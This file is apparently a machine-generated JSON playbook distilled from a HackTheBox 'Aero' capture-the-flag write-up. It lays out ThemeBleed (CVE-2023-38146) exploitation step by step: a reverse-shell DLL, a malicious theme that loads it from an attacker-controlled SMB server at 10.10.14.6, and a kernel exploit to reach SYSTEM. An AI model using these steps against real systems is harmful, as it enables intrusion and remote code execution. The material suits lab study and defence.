@@ -1,0 +1,746 @@
+{
+  "writeup_id": "Htb_Aero",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_themebleed_rce_upload",
+    "primary_services": [
+      "http",
+      "iis"
+    ],
+    "port_signature": "80",
+    "service_combination": "iis+file_upload",
+    "os_family": "windows_server",
+    "environment_type": "web_application",
+    "entry_vector": "file_upload_rce",
+    "privilege_path": "web_user_to_system",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "theme_file_upload_functionality",
+      "themebleed_cve_2023_38146",
+      "race_condition_exploit",
+      "dll_signature_bypass"
+    ],
+    "environmental_clues": [
+      "windows_theme_processing",
+      "file_upload_with_extension_filtering",
+      "iis_10_server",
+      "aspnet_core_application"
+    ],
+    "similar_scenarios": [
+      "file_upload_rce_boxes",
+      "windows_cve_showcase_boxes"
+    ],
+    "unique_aspects": [
+      "themebleed_vulnerability",
+      "msstyles_file_exploitation",
+      "version_999_race_condition",
+      "vrf_dll_replacement"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "ThemeBleed_CVE-2023-38146",
+        "success_reason": "Windows theme processing vulnerability with race condition in signature verification",
+        "prerequisite_indicators": [
+          "windows_theme_upload_functionality",
+          "unpatched_windows_system",
+          "smb_connectivity_allowed",
+          "theme_files_processed_automatically"
+        ],
+        "recognition_patterns": [
+          "theme upload forms accepting .theme/.themepack files",
+          "windows 10/11 or server 2016+ systems",
+          "IIS web servers with theme processing",
+          "file extension validation only"
+        ],
+        "failure_modes": [
+          "september_2023_patches_applied",
+          "smb_traffic_blocked",
+          "theme_processing_disabled",
+          "strict_file_validation"
+        ],
+        "environmental_factors": [
+          "unpatched_windows_system",
+          "smb_outbound_connectivity",
+          "automatic_theme_processing",
+          "insufficient_input_validation"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "SMB_Race_Condition_Exploit",
+        "success_reason": "Race condition between signature verification and DLL loading allows payload substitution",
+        "prerequisite_indicators": [
+          "smb_server_controllable",
+          "target_processes_msstyles_files",
+          "version_999_triggers_vulnerability",
+          "createfile_loadlibrary_timing_gap"
+        ],
+        "recognition_patterns": [
+          "msstyles file requests from target",
+          "_vrf.dll suffix requests",
+          "multiple file access attempts",
+          "timing-based file serving needed"
+        ],
+        "failure_modes": [
+          "race_condition_timing_missed",
+          "signature_verification_fails",
+          "smb_connection_issues",
+          "payload_detection"
+        ],
+        "environmental_factors": [
+          "network_latency_factors",
+          "system_performance_impact",
+          "antivirus_real_time_scanning",
+          "smb_protocol_version_compatibility"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Theme upload functionality with weak validation",
+        "discovery_method": "Web application reconnaissance and file upload testing",
+        "why_critical": "Entry point for ThemeBleed exploitation via malicious theme files",
+        "how_to_recognize": [
+          "file upload forms accepting theme extensions",
+          "extension-only validation",
+          "automatic theme processing mentioned",
+          "windows environment indicators"
+        ],
+        "follow_up_actions": [
+          "test_theme_file_upload",
+          "check_windows_patch_level",
+          "verify_smb_connectivity",
+          "prepare_themebleed_exploit"
+        ]
+      },
+      {
+        "discovery": "IIS 10.0 with ARR/3.0 configuration",
+        "discovery_method": "HTTP header analysis and service fingerprinting",
+        "why_critical": "Indicates modern Windows system potentially vulnerable to recent CVEs",
+        "how_to_recognize": [
+          "microsoft-iis/10.0 server header",
+          "x-powered-by: ARR/3.0 header",
+          "aspnetcore antiforgery tokens",
+          "modern windows os indicators"
+        ],
+        "follow_up_actions": [
+          "enumerate_recent_cves",
+          "check_patch_status",
+          "test_theme_upload_vectors",
+          "verify_exploit_compatibility"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "initial_access",
+        "escalation_method": "ThemeBleed_RCE_to_User_Shell",
+        "why_possible": "Unpatched CVE-2023-38146 allows arbitrary DLL execution via theme processing",
+        "recognition_signs": [
+          "theme_upload_functionality_present",
+          "windows_system_pre_september_2023_patches",
+          "smb_outbound_connectivity_available",
+          "automatic_theme_processing_enabled"
+        ],
+        "exploitation_path": "Upload malicious theme → SMB race condition → DLL execution → User shell"
+      },
+      {
+        "privilege_level": "user_shell",
+        "escalation_method": "CVE-2023-28252_Kernel_Exploit",
+        "why_possible": "Windows kernel vulnerability used by Nokoyawa ransomware group for privilege escalation",
+        "recognition_signs": [
+          "unpatched_windows_kernel",
+          "user_level_shell_obtained",
+          "kernel_exploit_compatibility",
+          "system_architecture_match"
+        ],
+        "exploitation_path": "User shell → Kernel exploit → SYSTEM privileges"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Single HTTP port (80) open on Windows host with IIS 10.0",
+        "decision": "Focus on web application enumeration and file upload functionality",
+        "reasoning": "Limited attack surface suggests web-based entry point, IIS indicates Windows target",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "port_scan_udp",
+            "when": "if web enumeration fails"
+          },
+          {
+            "option": "subdomain_enumeration",
+            "when": "if domain name discovered"
+          }
+        ],
+        "success_indicators": [
+          "file_upload_functionality_found",
+          "application_framework_identified",
+          "directory_structure_mapped"
+        ],
+        "next_decision": "analyze_upload_functionality"
+      },
+      {
+        "step": 2,
+        "situation": "Theme upload functionality accepting .theme/.themepack files",
+        "decision": "Research Windows theme vulnerabilities and exploit ThemeBleed CVE-2023-38146",
+        "reasoning": "Theme processing indicates potential for file-based RCE, recent CVE available",
+        "confidence": 0.95,
+        "prerequisites": [
+          "file_upload_accepts_theme_files",
+          "windows_target_confirmed"
+        ],
+        "success_indicators": [
+          "theme_file_uploaded_successfully",
+          "processing_behavior_observed"
+        ],
+        "failure_fallbacks": [
+          "other_file_upload_bypasses",
+          "web_shell_upload_attempts"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "ThemeBleed exploit requires custom DLL with specific export function",
+        "decision": "Build reverse shell DLL with VerifyThemeVersion export using Visual Studio",
+        "reasoning": "Exploit requires race condition with SMB-served DLL having specific function export",
+        "confidence": 0.85,
+        "prerequisites": [
+          "visual_studio_available",
+          "understanding_of_themebleed_mechanism"
+        ],
+        "success_indicators": [
+          "dll_compiles_successfully",
+          "correct_export_function_present"
+        ],
+        "failure_fallbacks": [
+          "use_existing_poc_dll",
+          "modify_existing_reverse_shell_dll"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_single_web_port": {
+        "action": "deep_web_enumeration",
+        "tools": [
+          "feroxbuster",
+          "burp_suite",
+          "manual_testing"
+        ],
+        "next_phase": "identify_upload_functionality"
+      },
+      "if_theme_upload_found": {
+        "action": "research_theme_vulnerabilities",
+        "alternatives": [
+          "themebleed_exploit",
+          "file_upload_bypass",
+          "path_traversal"
+        ],
+        "decision_criteria": "based_on_windows_version_and_patch_level"
+      },
+      "if_themebleed_applicable": {
+        "action": "setup_smb_server_and_dll_payload",
+        "purpose": "exploit_race_condition_in_theme_processing",
+        "tools": [
+          "visual_studio",
+          "themebleed_poc",
+          "impacket_smbserver"
+        ]
+      },
+      "if_dll_execution_achieved": {
+        "action": "establish_persistent_access",
+        "purpose": "maintain_foothold_for_privilege_escalation",
+        "tools": [
+          "reverse_shell",
+          "meterpreter",
+          "powershell_empire"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "prioritize_file_upload_functionality_on_limited_attack_surface",
+        "reasoning": "single_port_suggests_web_based_entry_point",
+        "applicability": "minimal_open_ports_scenarios"
+      },
+      {
+        "rule": "research_recent_cves_for_identified_technologies",
+        "reasoning": "theme_processing_suggests_specific_vulnerability_classes",
+        "applicability": "specialized_file_processing_functionality"
+      },
+      {
+        "rule": "build_custom_payloads_for_specific_exploit_requirements",
+        "reasoning": "some_exploits_require_specific_function_exports_or_behaviors",
+        "applicability": "complex_exploitation_scenarios"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "ThemeBleed",
+        "mitre_id": "T1203",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_functionality",
+          "theme_file_processing",
+          "windows_themes_enabled",
+          "vulnerable_windows_version"
+        ],
+        "success_indicators": [
+          "theme_themepack_upload_accepted",
+          "file_processing_occurs",
+          "race_condition_exploitable"
+        ],
+        "incompatible_with": [
+          "september_2023_patches_applied",
+          "file_upload_disabled",
+          "sandboxed_processing"
+        ],
+        "confidence_boosters": [
+          "automatic_theme_testing_mentioned",
+          "msstyles_processing_enabled",
+          "version_999_support"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Directory_Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_service_accessible",
+          "directory_structure_exists"
+        ],
+        "success_indicators": [
+          "hidden_directories_found",
+          "status_codes_200_403",
+          "directory_listings_enabled"
+        ],
+        "incompatible_with": [
+          "waf_blocking_requests",
+          "rate_limiting_aggressive"
+        ],
+        "confidence_boosters": [
+          "default_web_server_config",
+          "common_cms_patterns",
+          "backup_files_present"
+        ],
+        "typical_success_rate": 0.6,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "windows_iis": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "ASP.NET",
+          "ARR/"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "file_upload_service": {
+        "port_indicators": [
+          80,
+          443,
+          8080
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "upload",
+          "file",
+          "theme",
+          "multipart"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "theme_processing": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http"
+        ],
+        "banner_indicators": [
+          "theme",
+          "themepack",
+          "msstyles"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "themebleed_exploit",
+          "when": "theme_upload_detected_and_windows_iis",
+          "reason": "recent_cve_high_impact_rce"
+        },
+        {
+          "attack": "file_upload_bypass",
+          "when": "file_upload_with_extension_filtering",
+          "reason": "often_bypassable_leads_to_rce"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "iis_web_service_detected",
+          "reason": "may_reveal_admin_panels_or_config_files"
+        },
+        {
+          "attack": "version_enumeration",
+          "when": "iis_version_detected",
+          "reason": "helps_identify_patch_level_and_vulns"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "subdomain_enumeration",
+          "when": "domain_name_identified",
+          "reason": "may_find_additional_attack_surface"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "ThemeBleed",
+        "mitre_id": "T1203",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "ThemeBleed.exe",
+            "command_template": "ThemeBleed.exe make_theme {attacker_ip} {theme_file}",
+            "actual_command": "ThemeBleed.exe make_theme 10.10.14.6 exploit.theme",
+            "output_pattern": "Creates malicious .theme file",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "Visual Studio",
+            "command_template": "Build > Build Solution",
+            "actual_command": "Compile reverse shell DLL with VerifyThemeVersion export",
+            "success_factors": [
+              "correct_export_function",
+              "x64_architecture",
+              "release_build"
+            ],
+            "effectiveness_rating": 5
+          },
+          {
+            "name": "ThemeBleed SMB Server",
+            "command_template": "ThemeBleed.exe server",
+            "actual_command": "ThemeBleed.exe server",
+            "success_factors": [
+              "smb_port_445_available",
+              "windows_smb_service_disabled"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "windows_theme_processing_enabled",
+          "smb_connectivity_to_attacker",
+          "vulnerable_windows_version",
+          "theme_upload_capability"
+        ],
+        "success_indicators": [
+          "theme_file_uploaded_successfully",
+          "smb_connection_from_target",
+          "dll_loaded_and_executed",
+          "reverse_shell_connection_established"
+        ],
+        "common_failures": [
+          "smb_port_445_blocked",
+          "windows_defender_blocking_dll",
+          "incorrect_dll_export_function",
+          "patched_windows_version"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "persistence_mechanisms",
+          "lateral_movement"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Malicious DLL Creation",
+        "mitre_id": "T1055.001",
+        "category": "defense_evasion",
+        "phase": "execution",
+        "tools_used": [
+          {
+            "name": "Visual Studio",
+            "command_template": "Create DLL project with exported function",
+            "actual_command": "extern \"C\" __declspec(dllexport) int VerifyThemeVersion(void);",
+            "output_pattern": "DLL with specific export function",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "rundll32",
+            "command_template": "rundll32 {dll_path},{export_function}",
+            "actual_command": "rundll32 ReverseShellDLL.dll,VerifyThemeVersion",
+            "success_factors": [
+              "correct_export_name",
+              "valid_dll_format"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "visual_studio_installed",
+          "c++_development_knowledge",
+          "windows_development_environment"
+        ],
+        "success_indicators": [
+          "dll_compiles_successfully",
+          "export_function_visible",
+          "reverse_shell_connects_on_test"
+        ],
+        "common_failures": [
+          "function_name_mangling",
+          "incorrect_architecture_x86_vs_x64",
+          "missing_required_libraries"
+        ],
+        "follow_up_techniques": [
+          "dll_hijacking",
+          "process_injection",
+          "persistence_via_dll"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "ThemeBleed POC",
+        "use_case": "cve_2023_38146_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "windows_theme_exploitation"
+        ],
+        "alternatives": [
+          "manual_theme_crafting",
+          "custom_smb_server"
+        ],
+        "best_practices": [
+          "disable_windows_smb_service_first",
+          "test_dll_payload_locally",
+          "ensure_correct_export_function_name",
+          "use_x64_architecture_for_modern_windows"
+        ]
+      },
+      {
+        "tool": "Visual Studio",
+        "use_case": "windows_dll_development",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "medium",
+        "essential_for": [
+          "windows_payload_development"
+        ],
+        "alternatives": [
+          "mingw",
+          "clang",
+          "dev_cpp"
+        ],
+        "best_practices": [
+          "use_release_build_for_deployment",
+          "include_extern_c_for_clean_exports",
+          "test_with_rundll32_before_deployment"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "themebleed_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Create reverse shell DLL with VerifyThemeVersion export in Visual Studio",
+            "purpose": "Build malicious payload DLL",
+            "expected_output": "Compiled DLL with correct exports"
+          },
+          {
+            "step": 2,
+            "command": "copy ReverseShellDLL.dll .\\data\\stage_3",
+            "purpose": "Replace default payload in ThemeBleed",
+            "expected_output": "Custom payload ready for deployment"
+          },
+          {
+            "step": 3,
+            "command": "ThemeBleed.exe make_theme 10.10.14.6 exploit.theme",
+            "purpose": "Generate malicious theme file",
+            "expected_output": "exploit.theme file created"
+          },
+          {
+            "step": 4,
+            "command": "Disable Windows SMB service in services.msc",
+            "purpose": "Free up port 445 for custom SMB server",
+            "expected_output": "Port 445 available"
+          },
+          {
+            "step": 5,
+            "command": "ThemeBleed.exe server",
+            "purpose": "Start malicious SMB server",
+            "expected_output": "SMB server listening on port 445"
+          },
+          {
+            "step": 6,
+            "command": "Upload exploit.theme to target web application",
+            "purpose": "Deliver malicious theme file",
+            "expected_output": "Theme file accepted and processed"
+          }
+        ],
+        "success_rate": 0.8,
+        "typical_duration": "45-90 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Aero",
+      "difficulty": "Medium",
+      "os": "Windows 10/11 or Server 2016+",
+      "platform": "HackTheBox",
+      "release_date": "2023-09-28",
+      "author": "ctrlzero",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "cve_exploitation",
+        "dll_injection",
+        "file_upload"
+      ],
+      "key_vulnerabilities": [
+        "cve-2023-38146",
+        "cve-2023-28252",
+        "themebleed"
+      ],
+      "environment_type": "windows_web_server",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "recent_cve_exploitation",
+        "dll_development",
+        "kernel_exploits",
+        "ransomware_techniques"
+      ],
+      "prerequisite_knowledge": [
+        "windows_internals",
+        "dll_compilation",
+        "visual_studio",
+        "web_exploitation"
+      ]
+    },
+    "categorization": {
+      "primary_category": "cve_exploitation",
+      "subcategories": [
+        "kernel_exploitation",
+        "privilege_escalation",
+        "dll_injection"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation",
+        "code_execution"
+      ],
+      "defensive_lessons": [
+        "patch_management",
+        "file_upload_restrictions",
+        "theme_file_validation",
+        "kernel_hardening"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Outdated",
+        "Jeeves",
+        "Bounty"
+      ],
+      "similarity_reasons": [
+        "file_upload_vulnerability",
+        "windows_exploitation",
+        "recent_cves"
+      ],
+      "unique_aspects": [
+        "themebleed_exploitation",
+        "nokoyawa_ransomware_techniques",
+        "filesystemwatcher_automation"
+      ],
+      "difficulty_factors": [
+        "requires_dll_compilation",
+        "recent_cve_knowledge",
+        "visual_studio_usage"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T23:09:45.014225",
+    "original_file": "0xdf_writeups/Htb Aero.md",
+    "content_length": 48135,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
